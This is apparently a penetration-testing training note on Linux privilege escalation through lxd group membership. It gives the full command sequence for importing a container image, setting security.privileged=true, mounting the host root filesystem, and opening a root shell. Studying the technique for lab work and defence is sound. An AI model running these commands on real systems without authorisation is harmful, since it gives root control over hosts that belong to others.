# Linux Privilege Escalation
`The Guide`

- [Service-based Privilege Escalation]()
  - [Linux Containers](#linux-containers---lxc)

## Linux Containers - LXC
Confirming that the user is a part of lxc group.
```bash
container-user@nix02:~$ id
uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```
> **Overview:** From here on, there are now several ways in which we can exploit LXC/LXD. We can either create our own container and transfer it to the target system or use an existing container. Unfortunately, administrators often use templates that have little to no security. This attitude has the consequence that we already have tools that we can use against the system ourselves. Such templates often do not have passwords, especially if they are uncomplicated test environments.
```bash
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls

ubuntu-template.tar.xz
```
`Importing the container as an image.`
```bash
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list

+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
|                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
| ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
```
> Initiating the image and configuring it by specifying the security.privileged flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.
```bash
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> Starting the congtainer and logging into it.
```bash
container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
root@nix02:~#
```
